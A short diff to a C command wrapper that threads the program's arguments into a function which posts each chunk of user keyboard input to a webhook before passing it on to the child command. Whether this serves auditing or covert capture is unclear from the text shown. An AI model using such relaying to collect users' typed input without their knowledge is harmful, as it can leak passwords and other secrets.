@@ -139,7 +139,7 @@ void send_webhook(const char *operation, const char *input, char *args[]) {
 }
 
 // Function to handle user input/output between parent and child process
-void handle_input_output(int pipe_in, int pipe_out) {
+void handle_input_output(int pipe_in, int pipe_out, char *args[]) {
     fd_set read_fds;
     fd_set write_fds;
     int max_fd = (pipe_in > pipe_out) ? pipe_in : pipe_out;
@@ -165,7 +165,7 @@ void handle_input_output(int pipe_in, int pipe_out) {
             if (bytes_read > 0) {
                 buffer[bytes_read] = '\0';  // Null-terminate the string
                 // Send the input to the webhook instead of printing
-                send_webhook("User input received", buffer, NULL);
+                send_webhook("User input received", buffer, args);
                 write(pipe_in, buffer, bytes_read);  // Send input to the command
             }
         }
@@ -235,7 +235,7 @@ int main(int argc, char *argv[]) {
         close(pipe_out[1]);
 
         // Handle input and output
-        handle_input_output(pipe_in[1], pipe_out[0]);
+        handle_input_output(pipe_in[1], pipe_out[0], argv);
 
         // Wait for the child process to exit
         waitpid(pid, NULL, 0);
